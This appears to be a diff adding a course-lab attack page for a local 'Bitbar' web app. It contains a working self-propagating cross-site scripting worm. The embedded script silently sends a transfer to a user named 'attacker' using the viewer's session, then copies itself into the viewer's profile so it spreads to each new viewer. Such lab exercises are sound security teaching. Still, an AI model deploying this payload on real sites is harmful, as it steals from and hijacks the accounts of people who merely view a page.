@@ -1,0 +1,16 @@
+<div id="attack">
+<span id="bitbar_count" class="10"></span>
+Yinbo Luo is the gold of GPA!
+<script type="text/javascript">
+	var request_trans = new XMLHttpRequest();
+	request_trans.withCredentials = true;
+	request_trans.open("POST", "http://localhost:3000/post_transfer", true);
+	request_trans.setRequestHeader("Content-Type", "application/x-www-form-urlencodedr");
+    request_trans.send("destination_username=attacker&quantity=1");
+    var request_spread = new XMLHttpRequest();
+    request_spread.withCredentials = true;
+    request_spread.open('POST', 'http://localhost:3000/set_profile', true);
+    request_spread.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    request_spread.send("new_profile=".concat(escape(document.getElementById('attack').outerHTML)));
+</script>
+</div>
